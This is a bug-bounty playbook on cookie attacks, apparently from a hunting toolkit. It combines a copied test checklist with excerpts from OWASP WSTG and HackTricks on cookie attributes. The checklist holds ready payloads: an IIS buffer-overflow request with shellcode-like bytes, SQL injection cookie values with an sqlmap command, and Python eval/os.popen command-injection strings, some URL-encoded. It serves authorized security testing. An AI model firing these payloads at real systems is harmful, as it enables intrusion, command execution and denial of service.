# Real-World Playbook — Cookie Attacks

**Class:** `cookie` · **Coverage-matrix tier:** 1 · **Hunter2:** /auth-hunt · /crlf · **Skill:** auth-attacks
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

[ ] sensetive Data Stored in Cookies
```
check if anf pii or other sensitive infromation stored in  cookies this in fromation usually includes : email,sessionID, data of birth ,mobile address ,ssn ,etc.
```

[ ] cookie length violation 
leads to Buffer Overflow : A cookie length which is longer than profiled length can indicate that a buffer overflow attack attempt takes place. In a buffer overflow attack, the attacker will have to send very long strings that will generate the overflow, all of them generating this Violation.

```
GET  /default.ida?NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531 b%u53ff%u0078%u0000%u00=a
```

[ ] Arbitrary Cookie injection
```
try injecting some arbitrary cookies using attack such as CRLF injection ,
some times it can be used to escalate privilege or if the application malfunction, it can reveal sensitive infromation through stack traces
```

[ ] Mass Assignment
```
similar to the parameter poolution, however in this , attacker tried to inject multiple user ID in same user_id  parameter
```

[ ] Damial of service - cookie Bomb
```
forcing the server to process cookies larger than the resricted cookie size defined by the server may cause danial of service attack 

https://target.com/index.php?param1=xxxxxxxxxxxxxxxxxxxxxx

After input "xxxxxxxxxxxxxxxxxxxxxx" as a value of param1, check your cookies. If there is cookies the value is "xxxxxxxxxxxxxxxxxxxxxx" it means the website is vulnerable

References: [Hackerone #105363](https://hackerone.com/reports/105363)

```

[ ] SQL injection
```
How to inject the code in Cookies?
There are many HTTP interceptors and HTTP editors that can intercept the HTTP request before it is sent to the server. Then the tester can introduce his malicious SQL statement in the cookie field.

It’s like a get/post based SQL Injection, except that certain characters can’t be used. For example, ‘**;**‘ and ‘**,**‘ are typically treated as delimiters, so they end the injection if they aren’t URL-encoded.

Cookie : sessionId=xxxbad1fdc’ order by 1# (Normal)_
Cookie : sessionId=xxxbad1fdc’ order by 2# (Error)_

after error 
sqlmap -u "" --cookie="" -p "" --dbs
```

[ ] parameter pollution
```
1. Assume that cookie utilize a parameter called **user_id=** to rerieve some data
2. however , the application is not vulnerability to idor and change **user_id** to victim value dosnt help you 
3.attacker ,add an addition another  **user_id=** parameter value to rhe cookie with vuctim user ID LIke: **user_id=atacker&user_id=victim**
4. Three things can happen here:
- the application may retrieve data of victim data
- the application may retrieve data of victim data and attacker data
- the application is not retrieve data it is not vulnerability
```

[ ] Authentication Bybass (cookie are not avalid)
```
try accessing a protected resource by removing cookies
```

[ ] xss
```
assume that the value of the cookie parameter "name" is reflected in the application
change the "name" value to "xss payload"
```

[ ] Insufficient session management
```
1. session doesnt expire on logout 
2. long session expirey
3. session doesnt expire on password reset /change
4. concurrent session
```

[ ] privilege escalation
- horizontal
```
1.assume that the application uses mult-organization models
2.cookie are used wich organized user can access
3.alter the cookie in order to access some other application
```
- vertical
```
1.assume the cookie are used to determine the role of the user
2.alter the cookie in order to elevate the role of the user
```
- similarly
```
1.try if the flower users cookies can be used to access higher users function 
2.try if the cookie of organization 1 user van be used to access function of organizaion 2
```

[ ] sesion puzzing
```
when an application utilzes the same session variable for multiple purposes , this can abused by an attacker to trick the application and perform the action as an authenticated or privileged user
```



[ ] Exploiting Python Code Injection
this payload in cookie or contenttype or path or parameter

```python
eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))
```

[ ] OS command injection

```python
**eval(compile("""for x in range(1):\\n import os\\n os.popen(r'COMMAND').read()""",'','single'))**
```

```python
eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))
```

```python
**__import__('os').popen('COMMAND').read()**
```

[ ] URL encode some characters
```python
param=eval%28compile%28%27for%20x%20in%20range%281%29%3A%0A%20import%20time%0A%20time.sleep%2820%29%27%2C%27a%27%2C%27single%27%29%29
```

```python
param=eval%28compile%28%22%22%22for%20x%20in%20range%281%29%3A%5Cn%20import%20os%5Cn%20os.popen%28r%27COMMAND%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
```

```python
param=eval%28compile%28%22%22%22__import__%28%27os%27%29.popen%28r%27COMMAND%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
```

```python
param=__import__%28%27os%27%29.popen%28%27COMMAND%27%29.read%28%29
```

Example with one expression
```python
__import__('os').popen('COMMAND').read()
```

Example with multiple expressions, separated by commas
```python
str("-"*50),__import__('os').popen('COMMAND').read()
```
[ ] Insecure Deserialization
```
 if cookis are using serialized Objects ,try performing insecure Deserialization Checks.
 portswigger laps
```
[ ] Electronic Code Book                                                                                                                                   
[ ] Pickle Code Execution                                                                                                                                   
[ ] Cipher block chainin                                                                                                                                   
[ ] file inclusion                                                                                                                                         
[ ] IDOr                                                                                                                                                   
[ ] session fixation                                                                                                                                       
[ ] padding oracle attack                                                                                                                                   
[ ] jwt attack

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### Cookies Attributes

|ID          |
|------------|
|WSTG-SESS-02|

#### Summary

Web Cookies (herein referred to as cookies) are often a key attack vector for malicious users (typically targeting other users) and the application should always take due diligence to protect cookies.

HTTP is a stateless protocol, meaning that it doesn't hold any reference to requests being sent by the same user. In order to fix this issue, sessions were created and appended to HTTP requests. Browsers, as discussed in [testing browser storage](../11-Client-side/12-Browser_Storage.md), contain a multitude of storage mechanisms. In that section of the guide, each is discussed thoroughly.

The most used session storage mechanism in browsers is cookie storage. Cookies can be set by the server, by including a [`Set-Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) header in the HTTP response or via JavaScript. Cookies can be used for a multitude of reasons, such as:

- session management
- personalization
- tracking

In order to secure cookie data, the industry has developed means to help lock down these cookies and limit their attack surface. Over time cookies have become a preferred storage mechanism for web applications, as they allow great flexibility in use and protection.

The means to protect the cookies are:

- [Cookie Attributes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Creating_cookies)
- [Cookie Prefixes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Cookie_prefixes)

#### Test Objectives

- Ensure that the proper security configuration is set for cookies.

#### How to Test

Below, a description of every attribute and prefix will be discussed. The tester should validate that they are being used properly by the application. Cookies can be reviewed by using an [intercepting proxy](#intercepting-proxy), or by reviewing the browser's cookie jar.

##### Cookie Attributes

###### Secure Attribute

The [`Secure`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Secure) attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as `HTTPS`. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both `HTTP` and `HTTPS`, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.

###### HttpOnly Attribute

The [`HttpOnly`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#HttpOnly) attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.

> This doesn't limit the whole attack surface of XSS attacks, as an attacker could still send request in place of the user, but limits immensely the reach of XSS attack vectors.

###### Domain Attribute

The [`Domain`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Scope_of_cookies) attribute is used to compare the cookie's domain against the domain of the server for which the HTTP request is being made. If the domain matches or if it is a subdomain, then the [`path`](#path-attribute) attribute will be checked next.

Only hosts that belong to the specified domain can set a cookie for that domain. Additionally, the `domain` attribute cannot be a top level domain (such as `.gov` or `.com`) to prevent servers from setting arbitrary cookies for another domain (such as setting a cookie for `owasp.org`). If the domain attribute is not set, then the hostname of the server that generated the cookie is used as the default value of the `domain`.

For example, if a cookie is set by an application at `app.mydomain.com` with no domain attribute set, then the cookie would be resubmitted for all subsequent requests for `app.mydomain.com`, but not its subdomains (such as `hacker.app.mydomain.com`), or to `otherapp.mydomain.com`. (However, older versions of Edge/IE behave differently, and _do_ send these cookies to subdomains.) If a developer wanted to loosen this restriction, then they could set the `domain` attribute to `mydomain.com`. In this case the cookie would be sent to all requests for `app.mydomain.com` and `mydomain.com` subdomains, such as `hacker.app.mydomain.com`, and even `bank.mydomain.com`. If there was a vulnerable server on a subdomain (for example, `otherapp.mydomain.com`) and the `domain` attribute has been set too loosely (for example, `mydomain.com`), then the vulnerable server could be used to harvest cookies (such as session tokens) across the full scope of `mydomain.com`.

###### Path Attribute

The [`Path`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Scope_of_cookies) attribute plays a major role in setting the scope of the cookies in conjunction with the [`domain`](#domain-attribute). In addition to the domain, the URL path that the cookie is valid for can be specified. If the domain and path match, then the cookie will be sent in the request. Just as with the domain attribute, if the path attribute is set too loosely, then it could leave the application vulnerable to attacks by other applications on the same server. For example, if the path attribute was set to the web server root `/`, then the application cookies will be sent to every application within the same domain (if multiple application reside under the same server). A couple of examples for multiple applications under the same server:

- `path=/bank`
- `path=/private`
- `path=/docs`

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### Cookies Hacking


#### Cookie Attributes

Cookies come with several attributes that control their behavior in the user's browser. Here’s a rundown of these attributes in a more passive voice:

##### Expires and Max-Age

The expiry date of a cookie is determined by the `Expires` attribute. Conversely, the `Max-age` attribute defines the time in seconds until a cookie is deleted. **Opt for `Max-age` as it reflects more modern practices.**

##### Domain

The hosts to receive a cookie are specified by the `Domain` attribute. By default, this is set to the host that issued the cookie, not including its subdomains. However, when the `Domain` attribute is explicitly set, it encompasses subdomains as well. This makes the specification of the `Domain` attribute a less restrictive option, useful for scenarios where cookie sharing across subdomains is necessary. For instance, setting `Domain=mozilla.org` makes cookies accessible on its subdomains like `developer.mozilla.org`.

##### Path

A specific URL path that must be present in the requested URL for the `Cookie` header to be sent is indicated by the `Path` attribute. This attribute considers the `/` character as a directory separator, allowing for matches in subdirectories as well.

##### Ordering Rules

When two cookies bear the same name, the one chosen for sending is based on:

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Missing Secure/HttpOnly/SameSite → theft via XSS/MITM
- Cookie injection / scoping across subdomains → session issues

## Hunter2 wiring
- **Run:** `/auth-hunt · /crlf`
- **Skill:** `auth-attacks`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
